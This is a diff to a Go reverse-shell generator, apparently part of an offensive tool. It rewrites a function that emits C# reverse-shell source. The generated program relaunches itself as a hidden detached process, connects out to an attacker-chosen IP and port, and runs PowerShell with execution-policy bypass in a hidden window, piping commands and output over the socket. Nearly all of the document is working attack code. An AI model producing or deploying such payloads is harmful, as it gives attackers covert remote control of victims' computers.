@@ -55,50 +55,87 @@ func (r *ReverseShellGenerator) GeneratePowerShellDetached() string {
 	return fmt.Sprintf(`Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-EncodedCommand','%s') | Out-Null`, encoded)
 }
 
-// GenerateCSharpSource generates a C# reverse shell source file using cmd.exe with async stdout/stderr streaming.
+// GenerateCSharpSource generates a C# reverse shell source file using PowerShell with detached child launch.
 func (r *ReverseShellGenerator) GenerateCSharpSource() string {
 	return fmt.Sprintf(`using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
-using System.Text;
 
 public class Program
 {
-    public static void Main()
+    private static StreamWriter streamWriter;
+
+    private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
     {
-        using (var client = new TcpClient("%s", %d))
-        using (var stream = client.GetStream())
-        using (var reader = new StreamReader(stream, Encoding.ASCII))
-        using (var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true })
+        try
         {
-            var psi = new ProcessStartInfo
+            if (e.Data != null)
             {
-                FileName = "cmd.exe",
-                RedirectStandardInput = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            };
-
-            using (var proc = new Process { StartInfo = psi })
-            {
-                proc.OutputDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
-                proc.ErrorDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
-                proc.Start();
-                proc.BeginOutputReadLine();
-                proc.BeginErrorReadLine();
-                writer.Write("flame> ");
-
-                string line;
-                while ((line = reader.ReadLine()) != null)
-                {
-                    proc.StandardInput.WriteLine(line);
-                    proc.StandardInput.Flush();
-                }
+                streamWriter.WriteLine(e.Data);
+                streamWriter.Flush();
             }
         }
+        catch { }
+    }
+
+    private static Process StartPowerShell()
+    {
+        var proc = new Process();
+        proc.StartInfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+        proc.StartInfo.Arguments = "-ep bypass -nologo";
+        proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.StartInfo.RedirectStandardError = true;
+        proc.StartInfo.RedirectStandardInput = true;
+        proc.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
+        proc.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);
+        proc.Start();
+        proc.BeginOutputReadLine();
+        proc.BeginErrorReadLine();
+        return proc;
+    }
+
+    public static void Main(string[] args)
+    {
+        try
+        {
+            if (args.Length == 0 || args[0] != "--child")
+            {
+                var self = Process.GetCurrentProcess().MainModule.FileName;
+                var psi = new ProcessStartInfo();
+                psi.FileName = self;
+                psi.Arguments = "--child";
+                psi.WindowStyle = ProcessWindowStyle.Hidden;
+                psi.UseShellExecute = true;
+                Process.Start(psi);
+                return;
+            }
+
+            using (var client = new TcpClient("%s", %d))
+            using (var stream = client.GetStream())
+            using (var reader = new StreamReader(stream))
+            {
+                streamWriter = new StreamWriter(stream);
+                streamWriter.AutoFlush = true;
+                Process proc = StartPowerShell();
+
+                string userInput = "";
+                while ((userInput = reader.ReadLine()) != null)
+                {
+                    proc.StandardInput.WriteLine(userInput);
+                    proc.StandardInput.Flush();
+                    if (userInput.Equals("exit", StringComparison.OrdinalIgnoreCase))
+                        break;
+                }
+
+                try { if (!proc.HasExited) proc.Kill(); } catch { }
+                try { proc.WaitForExit(); } catch { }
+                proc.Dispose();
+            }
+        }
+        catch { }
     }
 }
 `, r.IP, r.Port)
